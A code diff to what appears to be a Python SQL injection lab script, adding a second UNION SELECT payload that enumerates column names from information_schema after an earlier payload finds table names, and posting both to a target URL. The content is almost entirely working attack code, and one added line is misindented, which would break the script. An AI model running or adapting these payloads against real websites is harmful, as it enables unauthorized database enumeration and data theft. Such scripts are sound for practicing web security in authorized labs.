@@ -62,9 +62,7 @@ def main(args):
         "UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'"
                              )
     log.info(f"Sending SQLi Payload: {payload}")
-    """
-    stop
-    :wq"""
+    
     if shop.no_proxy:
         resp = requests.post(url, data=payload)
     else:
@@ -72,7 +70,17 @@ def main(args):
     pattern = re.compile(r"(users)")
     m = pattern.search(resp.text)
     table_name = m[1]
-    #print(resp.text)
+    payload = format_payload(
+        f"UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'"
+    )
+     log.info(f"Sending SQLi Payload: {payload}")
+    
+    if shop.no_proxy:
+        resp = requests.post(url, data=payload)
+    else:
+        resp = requests.post(url, data=payload, proxies=utils.PROXIES, verify=False)
+
+    print(resp.text)
     
     
 if __name__ == "__main__":
